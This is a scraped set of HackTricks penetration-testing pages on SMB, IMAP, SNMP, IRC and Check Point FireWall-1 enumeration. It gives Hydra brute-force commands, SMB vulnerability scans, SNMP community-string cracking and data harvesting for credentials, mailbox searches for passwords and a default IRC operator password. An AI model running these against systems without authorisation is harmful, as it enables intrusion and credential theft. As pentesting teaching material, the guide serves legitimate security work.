--script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}\n‚Äã\nEntry_4:\nName: Nmap Smb Scan 2\nDescription: SMB Vuln Scan With Nmap (Less Specific)\nCommand: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}\n‚Äã\nEntry_5:\nName: Hydra Brute Force\nDescription: Need User\nCommand: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb\nEntry_6:\nName: SMB/SMB2 139/445 consolesless mfs enumeration\nDescription: SMB/SMB2 139/445  enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n137,138,139 - Pentesting NetBios\nNext\nrpcclient enumeration\nLast modified\n20d ago"
    },
    {
        "title": "143,993 - Pentesting IMAP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap",
        "text": "143,993 - Pentesting IMAP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nInternet Message Access Protocol\nAs its name implies, IMAP allows you to\naccess your email messages wherever you are\n; much of the time, it is accessed via the Internet. Basically, email\nmessages are stored on servers\n. Whenever you check your inbox, your email client contacts the server to connect you with your messages. When you read an email message using IMAP,\nyou aren't actually downloading\nor storing it on your computer; instead, you are\nreading it off of the server\n. As a result, it's possible to check your email from\nseveral different devices\nwithout missing a thing.\nBy default, the IMAP protocol works on two ports:\nPort 143\n- this is the default IMAP non-encrypted port\nPort 993\n- this is the port you need to use if you want to connect using IMAP securely\nPORT    STATE SERVICE REASON\n143/tcp open  imap    syn-ack\nBanner grabbing\nnc\n-nv\n<\nIP\n>\n143\nopenssl s_client\n-connect\n<\nIP\n>\n:993\n-quiet\nNTLM Auth - Information disclosure\nIf the server supports NTLM auth (Windows) you can obtain sensitive info (versions):\nroot@kali: telnet example.com 143\n* OK The Microsoft Exchange IMAP4 service is ready.\n>> a1 AUTHENTICATE NTLM\n+\n>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=\n+ TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA\nOr\nautomate\nthis with\nnmap\nplugin\nimap-ntlm-info.nse\n‚Äã\nIMAP Bruteforce\n‚Äã\nSyntax\nLogin\nA1 LOGIN username password\nValues can be quoted to enclose spaces and special characters. A \" must then be escape with a \\\nA1 LOGIN \"username\" \"password\"\n‚Äã\nList Folders/Mailboxes\nA1 LIST \"\" *\nA1 LIST INBOX *\nA1 LIST \"Archive\" *\n‚Äã\nCreate new Folder/Mailbox\nA1 CREATE INBOX.Archive.2012\nA1 CREATE \"To Read\"\n‚Äã\nDelete Folder/Mailbox\nA1 DELETE INBOX.Archive.2012\nA1 DELETE \"To Read\"\n‚Äã\nRename Folder/Mailbox\nA1 RENAME \"INBOX.One\" \"INBOX.Two\"\n‚Äã\nList Subscribed Mailboxes\nA1 LSUB \"\" *\n‚Äã\nStatus of Mailbox (There are more flags than the ones listed)\nA1 STATUS INBOX (MESSAGES UNSEEN RECENT)\n‚Äã\nSelect a mailbox\nA1 SELECT INBOX\n‚Äã\nList messages\nA1 FETCH 1:* (FLAGS)\nA1 UID FETCH 1:* (FLAGS)\n‚Äã\nRetrieve Message Content\nA1 FETCH 2 body[text]\nA1 FETCH 2 all\nA1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])\n‚Äã\nClose Mailbox\nA1 CLOSE\n‚Äã\nLogout\nA1 LOGOUT\nFrom\nhere\n‚Äã\nEvolution\napt install evolution\nCURL\nBasic navigation is possible with\nCURL\n, but the documentation is light on details so checking the\nsource\nis recommended for precise details.\n1.\nListing mailboxes (imap command\nLIST \"\" \"*\"\n)\n$\ncurl\n-k\n'imaps://1.2.3.4/'\n--user\nuser:pass\n2.\nListing messages in a mailbox (imap command\nSELECT INBOX\nand then\nSEARCH ALL\n)\n$\ncurl\n-k\n'imaps://1.2.3.4/INBOX?ALL'\n--user\nuser:pass\nThe result of this search is a list of message indicies.\nIts also possible to provide more complex search terms. e.g. searching for drafts with password in mail body:\n$\ncurl\n-k\n'imaps://1.2.3.4/Drafts?TEXT password'\n--user\nuser:pass\nA nice overview of the search terms possible is located\nhere\n.\n3.\nDownloading a message (imap command\nSELECT Drafts\nand then\nFETCH 1 BODY[]\n)\n$\ncurl\n-k\n'imaps://1.2.3.4/Drafts;MAILINDEX=1'\n--user\nuser:pass\nThe mail index will be the same index returned from the search operation.\nIt is also possible to use\nUID\n(unique id) to access messages, however it is less conveniant as the search command needs to be manually formatted. E.g.\n$\ncurl\n-k\n'imaps://1.2.3.4/INBOX'\n-X\n'UID SEARCH ALL'\n--user\nuser:pass\n$\ncurl\n-k\n'imaps://1.2.3.4/INBOX;UID=1'\n--user\nuser:pass\nAlso, possible to download just parts of a message, e.g. subject and sender of first 5 messages (the\n-v\nis required to see the subject and sender):\n$\ncurl\n-k\n'imaps://1.2.3.4/INBOX'\n-X\n'FETCH 1:5 BODY[HEADER.FIELDS (SUBJECT FROM)]'\n--user\nuser:pass\n-v\n2\n>\n&1\n|\ngrep\n'^<'\nAlthough, its probably cleaner to just write a little for loop:\nfor m in {1..5}; do\necho $m\ncurl \"imap://1.2.3.4/INBOX;MAILINDEX=$m;SECTION=HEADER.FIELDS%20(SUBJECT%20FROM)\" --user user:pass\ndone\nShodan\nport:143 CAPABILITY\nport:993 CAPABILITY\nHackTricks Automatic Commands\nProtocol_Name: IMAP    #Protocol Abbreviation if there is one.\nPort_Number:  143,993     #Comma separated if there is more than one.\nProtocol_Description: Internet Message Access Protocol         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for WHOIS\nNote: |\nAs its name implies, IMAP allows you to access your email messages wherever you are; much of the time, it is accessed via the Internet. Basically, email messages are stored on servers. Whenever you check your inbox, your email client contacts the server to connect you with your messages. When you read an email message using IMAP, you aren't actually downloading or storing it on your computer; instead, you are reading it off of the server. As a result, it's possible to check your email from several different devices without missing a thing.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-imap\n‚Äã\nEntry_2:\nName: Banner Grab\nDescription: Banner Grab 143\nCommand: nc -nv {IP} 143\n‚Äã\nEntry_3:\nName: Secure Banner Grab\nDescription: Banner Grab 993\nCommand: openssl s_client -connect {IP}:993 -quiet\nEntry_4:\nName: consolesless mfs enumeration\nDescription: IMAP enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/imap/imap_version; set RHOSTS {IP}; set RPORT 143; run; exit'\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nrpcclient enumeration\nNext\n- Network Services Pentesting\n161,162,10161,10162/udp - Pentesting SNMP\nLast modified\n2mo ago"
    },
    {
        "title": "161,162,10161,10162/udp - Pentesting SNMP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp",
        "text": "161,162,10161,10162/udp - Pentesting SNMP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nBasic Information\nSNMP - Simple Network Management Protocol\nis a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...).\nPORT    STATE SERVICE REASON                 VERSION\n161/udp open  snmp    udp-response ttl 244   ciscoSystems SNMPv3 server (public)\nSNMP also uses the port\n162/UDP\nfor\ntraps\n. These are data\npackets sent from the SNMP server to the client without being explicitly requested\n.\nMIB\nTo ensure that SNMP access works across manufacturers and with different client-server combinations, the\nManagement Information Base (MIB)\nwas created. MIB is an\nindependent format for storing device information\n. A MIB is a\ntext\nfile in which all queryable\nSNMP objects\nof a device are listed in a\nstandardized\ntree hierarchy. It contains at\nleast one\nObject Identifier\n(\nOID\n)\n, which, in addition to the necessary\nunique address\nand a\nname\n, also provides information about the type, access rights, and a description of the respective object\nMIB files are written in the\nAbstract Syntax Notation One\n(\nASN.1\n) based ASCII text format. The\nMIBs do not contain data\n, but they explain\nwhere to find which information\nand what it looks like, which returns values for the specific OID, or which data type is used.\nOIDs\nOIDs\nstands for\nO\nbject\nId\nentifiers.\nOIDs uniquely identify managed objects in a MIB hierarchy\n. This can be depicted as a tree, the levels of which are assigned by different organizations. Top level MIB object IDs (OIDs) belong to different standard organizations.\nVendors define private branches including managed objects for their own products.\nYou can\nnavigate\nthrough an\nOID tree\nfrom the web here:\nhttp://www.oid-info.com/cgi-bin/display?tree=#focus\nor\nsee what a OID means\n(like\n1.3.6.1.2.1.1\n) accessing\nhttp://oid-info.com/get/1.3.6.1.2.1.1\n.\nThere are some\nwell-known OIDs\nlike the ones inside\n1.3.6.1.2.1\nthat references MIB-2 defined Simple Network Management Protocol (SNMP) variables. And from the\nOIDs pending from this one\nyou can obtain some interesting host data (system data, network data, processes data...)\nOID Example\n1 . 3 . 6 . 1 . 4 . 1 . 1452 . 1 . 2 . 5 . 1 . 3. 21 . 1 . 4 . 7\nHere is a breakdown of this address.\n1 ‚Äì this is called the ISO and it establishes that this is an OID. This is why all OIDs start with ‚Äú1‚Äù\n3 ‚Äì this is called ORG and it is used to specify the organization that built the device.\n6 ‚Äì this is the dod or the Department of Defense which is the organization that established the Internet first.\n1 ‚Äì this is the value of the internet to denote that all communications will happen through the Internet.\n4 ‚Äì this value determines that this device is made by a private organization and not a government one.\n1 ‚Äì this value denotes that the device is made by an enterprise or a business entity.\nThese first six values tend to be the same for all devices and they give you the basic information about them. This sequence of numbers will be the same for all OIDs, except when the device is made by the government.\nMoving on to the next set of numbers.\n1452 ‚Äì gives the name of the organization that manufactured this device.\n1 ‚Äì explains the type of device. In this case, it is an alarm clock.\n2 ‚Äì determines that this device is a remote terminal unit.\nThe rest of the values give specific information about the device.\n5 ‚Äì denotes a discrete alarm point.\n1 ‚Äì specific point in the device\n3 ‚Äì port\n21 ‚Äì address of the port\n1 ‚Äì display for the port\n4 ‚Äì point number\n7 ‚Äì state of the point\n(Example take from\nhere\n)\nSNMP Versions\nThere are 2 important versions of SNMP:\nSNMPv1\n: Main one, it is still the most frequent, the\nauthentication is based on a string\n(community string) that travels in\nplain-text\n(all the information travels in plain text).\nVersion 2 and 2c\nsend the\ntraffic in plain text\nalso and uses a\ncommunity string as authentication\n.\nSNMPv3\n: Uses a better\nauthentication\nform and the information travels\nencrypted\nusing (\ndictionary attack\ncould be performed but would be much harder to find the correct creds than in SNMPv1 and v2).\nCommunity Strings\nAs mentioned before,\nin order to access the information saved on the MIB you need to know the community string on versions 1 and 2/2c and the credentials on version 3.\nThe are\n2 types of community strings\n:\npublic\nmainly\nread only\nfunctions\nprivate\nRead/Write\nin general\nNote that\nthe writability of an OID depends on the community string used\n, so\neven\nif you find that \"\npublic\n\" is being used, you could be able to\nwrite some values.\nAlso, there\nmay\nexist objects which are\nalways \"Read Only\".\nIf you try to\nwrite\nan object a\nnoSuchName\nor\nreadOnly\nerror\nis received**.**\nIn versions 1 and 2/2c if you to use a\nbad\ncommunity string the server wont\nrespond\n. So, if it responds, a\nvalid community strings was used\n.\nPorts\nThe SNMP agent receives requests on UDP port\n161\n.\nThe manager receives notifications (\nTraps\nand\nInformRequests\n) on port\n162\n.\nWhen used with\nTransport Layer Security\nor\nDatagram Transport Layer Security\n, requests are received on port\n10161\nand notifications are sent to port\n10162\n.\nBrute-Force Community String (v1 and v2c)\nTo\nguess the community string\nyou could perform a dictionary attack. Check\nhere different ways to perform a brute-force attack against SNMP\n. A frequently used community string is\npublic\n.\nEnumerating SNMP\nIt is recommanded to install the following to see whats does mean\neach OID gathered\nfrom the device:\napt-get\ninstall\nsnmp-mibs-downloader\ndownload-mibs\n# Finally comment the line saying \"mibs :\" in /etc/snmp/snmp.conf\nsudo\nvi\n/etc/snmp/snmp.conf\nIf you know a valid community string, you can access the data using\nSNMPWalk\nor\nSNMP-Check\n:\nsnmpbulkwalk\n-c\n[\nCOMM_STRING\n]\n-v\n[\nVERSION\n]\n[\nIP\n]\n.\n#Don't forget the final dot\nsnmpbulkwalk\n-c\npublic\n-v2c\n10.10\n.11.136\n.\n‚Äã\nsnmpwalk\n-v\n[\nVERSION_SNMP\n]\n-c\n[\nCOMM_STRING\n]\n[\nDIR_IP\n]\nsnmpwalk\n-v\n[\nVERSION_SNMP\n]\n-c\n[\nCOMM_STRING\n]\n[\nDIR_IP\n]\n1.3\n.6.1.2.1.4.34.1.3\n#Get IPv6, needed dec2hex\nsnmpwalk\n-v\n[\nVERSION_SNMP\n]\n-c\n[\nCOMM_STRING\n]\n[\nDIR_IP\n]\nNET-SNMP-EXTEND-MIB::nsExtendObjects\n#get extended\nsnmpwalk\n-v\n[\nVERSION_SNMP\n]\n-c\n[\nCOMM_STRING\n]\n[\nDIR_IP\n]\n.1\n#Enum all\n‚Äã\nsnmp-check\n[\nDIR_IP\n]\n-p\n[\nPORT\n]\n-c\n[\nCOMM_STRING\n]\n‚Äã\nnmap\n--script\n\"snmp* and not snmp-brute\"\n<\ntarget\n>\n‚Äã\nbraa\n<\ncommunity string\n>\n@\n<\nIP\n>\n:.1.3.6.*\n#Bruteforce specific OID\nThanks to extended queries (download-mibs), it is possible to enumerate even more about the system with the following command :\nsnmpwalk\n-v\nX\n-c\npublic\n<\nIP\n>\nNET-SNMP-EXTEND-MIB::nsExtendOutputFull\nSNMP\nhas a lot of information about the host and things that you may find interesting are:\nNetwork interfaces\n(IPv4 and\nIPv6\naddress), Usernames, Uptime, Server/OS version, and\nprocesses\nrunning\n(may contain passwords)....\nDangerous Settings\nFrom\nhttps://academy.hackthebox.com/module/112/section/1075\n****\nSettings\nDescription\nrwuser noauth\nProvides access to the full OID tree without authentication.\nrwcommunity <community string> <IPv4 address>\nProvides access to the full OID tree regardless of where the requests were sent from.\nrwcommunity6 <community string> <IPv6 address>\nSame access as with\nrwcommunity\nwith the difference of using IPv6.\nCisco\nTake a look to this page if you are Cisco equipment:\nCisco SNMP\nFrom SNMP to RCE\nIf you have the\nstring\nthat allows you to\nwrite values\ninside the SNMP service, you may be able to abuse it to\nexecute commands\n:\nSNMP RCE\nMassive SNMP\n‚Äã\nBraa\nis a mass SNMP scanner. The intended usage of such a tool is, of course, making SNMP queries ‚Äì but unlike snmpwalk from net-snmp, it is able to query dozens or hundreds of hosts simultaneously, and in a single process. Thus, it consumes very few system resources and does the scanning VERY fast.\nBraa implements its OWN snmp stack, so it does NOT need any SNMP libraries like net-snmp.\nSyntax:\nbraa [Community-string]@[IP of SNMP server]:[iso id]\nbraa\n[email¬†protected]\n:.1.3.6.*\nThis can extract a lot MB of information that you cannot process manually.\nSo, lets look for the most interesting information (from\nhttps://blog.rapid7.com/2016/05/05/snmp-data-harvesting-during-penetration-testing/\n):\nDevices\nOne of the first things I do is extract the sysDesc .1.3.6.1.2.1.1.1.0 MIB data from each file to determine what devices I have harvested information from. This can easily be done using the following grep command:\ngrep \".1.3.6.1.2.1.1.1.0\" *.snmp\nIdentify private string\nAs an example, if I can identify the private community string used by an organization on their Cisco IOS routers, then I could possibly use that community string to extract the running configurations from those routers. The best method for finding such data has often been related to SNMP Trap data. So again, using the following grep we can parse through a lot of MIB data quickly searching for the key word of ‚Äútrap‚Äù:\ngrep\n-i\n\"trap\"\n*.snmp\nUsernames/passwords\nAnother area of interest is logs, I have discovered that there are some devices that hold logs within the MIB tables. These logs can also contain failed logon attempts. Think about the last time you logged into a device via Telnet or SSH and inadvertently entered your password as the username. I typically search for key words such as\nfail\n,\nfailed\nor\nlogin\nand examine that data to see if there is anything of value.\ngrep\n-i\n\"login\\|fail\"\n*.snmp\nEmails\ngrep\n-E\n-o\n\"\n\\b\n[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\n\\b\n\"\n*.snmp\nModifying SNMP values\nYou can use\nNetScanTools\nto\nmodify values\n. You will need to know the\nprivate string\nin order to do so.\nSpoofing\nIf there is an ACL that only allows some IPs to query the SMNP service, you can spoof one of this addresses inside the UDP packet an sniff the traffic.\nExamine SNMP Configuration files\nsnmp.conf\nsnmpd.conf\nsnmp-config.xml\nHackTricks Automatic Commands\nProtocol_Name: SNMP    #Protocol Abbreviation if there is one.\nPort_Number:  161     #Comma separated if there is more than one.\nProtocol_Description: Simple Network Managment Protocol         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for SNMP\nNote: |\nSNMP - Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...).\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-snmp\n‚Äã\nEntry_2:\nName: SNMP Check\nDescription: Enumerate SNMP\nCommand: snmp-check {IP}\n‚Äã\nEntry_3:\nName: OneSixtyOne\nDescription: Crack SNMP passwords\nCommand: onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100\n‚Äã\nEntry_4:\nName: Nmap\nDescription: Nmap snmp (no brute)\nCommand: nmap --script \"snmp* and not snmp-brute\" {IP}\n‚Äã\nEntry_5:\nName: Hydra Brute Force\nDescription: Need Nothing\nCommand: hydra -P {Big_Passwordlist} -v {IP} snmp\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n143,993 - Pentesting IMAP\nNext\nCisco SNMP\nLast modified\n6mo ago"
    },
    {
        "title": "194,6667,6660-7000 - Pentesting IRC",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc",
        "text": "194,6667,6660-7000 - Pentesting IRC\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nIRC was\noriginally a plain text protocol\n(although later extended), which on request was assigned port\n194/TCP by IANA\n. However, the de facto standard has always been to\nrun IRC on 6667/TCP\nand nearby port numbers (for example TCP ports 6660‚Äì6669, 7000) to\navoid\nhaving to run the IRCd software with\nroot privileges\n.\nFor connecting to a server it is required merely a\nnickname\n. Once connection is established, the first thing the server does is a reverse-dns to your ip:\nIt seems that overall\nthere are two kinds of users\n:\noperators\nand ordinary\nusers\n. For logging in as an\noperator\nit is required a\nusername\nand a\npassword\n(and in many occasions a particular hostname, ip and even a particular hostmask). Within operators there are different privilege levels wherein the administrator has the highest privilege.\nDefault ports:\n194, 6667, 6660-7000\nPORT     STATE SERVICE\n6667/tcp open  irc\nEnumeration\nBanner\nIRC can support\nTLS\n.\nnc\n-vn\n<\nIP\n>\n<\nPORT\n>\nopenssl s_client\n-connect\n<\nIP\n>\n:\n<\nPORT\n>\n-quiet\nManual\nHere you can see how to connect and access the IRC using some\nrandom nickname\nand then enumerate some interesting info. You can learn more commands of IRC\nhere\n.\n#Connection with random nickname\nUSER\nran213eqdw123\n0\n* ran213eqdw123\nNICK ran213eqdw123\n#If a PING :<random> is responded you need to send\n#PONG :<received random>\n‚Äã\nVERSION\nHELP\nINFO\nLINKS\nHELPOP USERCMDS\nHELPOP OPERCMDS\nOPERATOR CAPA\nADMIN\n#Admin info\nUSERS\n#Current number of users\nTIME\n#Server's time\nSTATS a\n#Only operators should be able to run this\nNAMES\n#List channel names and usernames inside of each channel -> Nombre del canal y nombre de las personas que estan dentro\nLIST\n#List channel names along with channel banner\nWHOIS\n<\nUSERNAME\n>\n#WHOIS a username\nUSERHOST\n<\nUSERNAME\n>\n#If available, get hostname of a user\nUSERIP\n<\nUSERNAME\n>\n#If available, get ip of a user\nJOIN\n<\nCHANNEL_NAME\n>\n#Connect to a channel\n‚Äã\n#Operator creds Brute-Force\nOPER\n<\nUSERNAME\n>\n<\nPASSWORD\n>\nYou can, also, atttempt to login to the server with a password. The default password for ngIRCd is 'wealllikedebian'.\nPASS wealllikedebian\nNICK patrick\nUSER\ntest1 test2\n<\nIP\n>\n:test3\nFind and scan IRC services\nnmap\n-sV\n--script\nirc-botnet-channels,irc-info,irc-unrealircd-backdoor\n-p\n194,6660\n-7000\n<\nip\n>\n‚Äã\nBrute Force\n‚Äã\nShodan\nlooking up your hostname\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nSNMP RCE\nNext\n- Network Services Pentesting\n264 - Pentesting Check Point FireWall-1\nLast modified\n6mo ago"
    },
    {
        "title": "264 - Pentesting Check Point FireWall-1",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-264-check-point-firewall-1",
        "text": "264 - Pentesting Check Point FireWall-1\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nModule sends a query to the port\n264/TCP\non\nCheckPoint\nFirewall-1\nfirewalls to obtain the firewall name and management station (such as SmartCenter) name via a pre-authentication request\nuse auxiliary/gather/checkpoint_hostname\nset RHOST 10.10.xx.xx\nSample Output\n[*] Attempting to contact Checkpoint FW1 SecuRemote Topology service...\n[+] Appears to be a CheckPoint Firewall...\n[+] Firewall Host: FIREFIGHTER-SEC\n[+] SmartCenter Host: FIREFIGHTER-MGMT.example.com\n[*] Auxiliary module execution completed\nFrom:\nhttps://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html#check-point-firewall-1-topology-port-264\n‚Äã\nAnother way to obtain the firewall's hostname and ICA name could be\nprintf\n'\\x51\\x00\\x00\\x00\\x00\\x00\\x00\\x21\\x00\\x00\\x00\\x0bsecuremote\\x00'\n|\nnc\n-q\n1\nx.x.x.x\n264\n|\ngrep\n-a\nCN\n|\ncut\n-c\n2\n-\nSample Output\nCN=Panama,O=MGMTT.srv.rxfrmi\nFrom:\nhttps://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk69360\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin 